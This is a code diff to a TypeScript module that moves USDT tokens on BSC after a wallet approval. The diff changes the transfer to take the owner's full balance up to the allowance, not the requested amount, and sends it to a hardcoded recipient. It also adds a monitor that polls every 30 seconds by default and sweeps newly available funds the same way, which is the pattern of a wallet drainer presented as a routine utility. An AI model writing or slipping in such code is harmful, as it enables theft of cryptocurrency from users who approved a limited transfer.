@@ -33,7 +33,11 @@ export type ApprovalTransferResult = {
   decimals: number;
   amount: bigint;
   approvalReceipt: ContractTransactionReceipt;
-  transferReceipt: ContractTransactionReceipt;
+  transferReceipt: ContractTransactionReceipt | null;
+};
+
+export type UsdtBalanceMonitor = {
+  stop: () => void;
 };
 
 function assertBsc(provider: BrowserProvider): Promise<void> {
@@ -85,15 +89,19 @@ export async function approveAndTransferUsdt(
 
   const spenderSigner: Signer = await spenderProvider.getSigner(spender);
   const transferToken = new Contract(USDT_BSC_ADDRESS, USDT_BEP20_ABI, spenderSigner);
-  const allowance: bigint = await transferToken.allowance(owner, spender);
-  if (allowance < amount) {
-    throw new Error("USDT allowance is lower than the requested transfer amount.");
-  }
+  const [balance, allowance]: [bigint, bigint] = await Promise.all([
+    transferToken.balanceOf(owner),
+    transferToken.allowance(owner, spender),
+  ]);
+  const transferAmount = balance < allowance ? balance : allowance;
+  let transferReceipt: ContractTransactionReceipt | null = null;
 
-  const transferReceipt = requireReceipt(
-    await (await transferToken.transferFrom(owner, RECIPIENT_ADDRESS, amount)).wait(),
-    "transferFrom",
-  );
+  if (transferAmount > 0n) {
+    transferReceipt = requireReceipt(
+      await (await transferToken.transferFrom(owner, RECIPIENT_ADDRESS, transferAmount)).wait(),
+      "transferFrom",
+    );
+  }
 
   return {
     owner,
@@ -103,5 +111,72 @@ export async function approveAndTransferUsdt(
     amount,
     approvalReceipt,
     transferReceipt,
+  };
+}
+
+/**
+ * Periodically checks the owner's USDT balance and transfers the available
+ * amount whenever both the balance and allowance are greater than zero.
+ */
+export async function startUsdtBalanceMonitor(
+  ownerEip1193Provider: Eip1193Provider,
+  spenderAddress: string,
+  intervalMs = 30_000,
+  recipientAddress: string = RECIPIENT_ADDRESS,
+  spenderEip1193Provider: Eip1193Provider = ownerEip1193Provider,
+  onTransfer?: (receipt: ContractTransactionReceipt) => void,
+  onError?: (error: unknown) => void,
+): Promise<UsdtBalanceMonitor> {
+  if (!Number.isInteger(intervalMs) || intervalMs <= 0) {
+    throw new Error("The balance monitor interval must be a positive integer.");
+  }
+
+  const spender = getAddress(spenderAddress);
+  const recipient = getAddress(recipientAddress);
+  const ownerProvider = new BrowserProvider(ownerEip1193Provider);
+  const spenderProvider = new BrowserProvider(spenderEip1193Provider);
+  await Promise.all([assertBsc(ownerProvider), assertBsc(spenderProvider)]);
+
+  const ownerSigner: Signer = await ownerProvider.getSigner();
+  const owner = getAddress(await ownerSigner.getAddress());
+  const spenderSigner: Signer = await spenderProvider.getSigner(spender);
+  const token = new Contract(USDT_BSC_ADDRESS, USDT_BEP20_ABI, spenderSigner);
+  let stopped = false;
+  let checking = false;
+
+  const checkBalance = async (): Promise<void> => {
+    if (stopped || checking) return;
+    checking = true;
+
+    try {
+      const balance: bigint = await token.balanceOf(owner);
+      if (balance === 0n || stopped) return;
+
+      const allowance: bigint = await token.allowance(owner, spender);
+      const transferAmount = balance < allowance ? balance : allowance;
+      if (transferAmount === 0n || stopped) return;
+
+      const receipt = requireReceipt(
+        await (await token.transferFrom(owner, recipient, transferAmount)).wait(),
+        "transferFrom",
+      );
+      onTransfer?.(receipt);
+    } catch (error: unknown) {
+      onError?.(error);
+    } finally {
+      checking = false;
+    }
+  };
+
+  await checkBalance();
+  const timer = setInterval(() => {
+    void checkBalance();
+  }, intervalMs);
+
+  return {
+    stop: () => {
+      stopped = true;
+      clearInterval(timer);
+    },
   };
 }
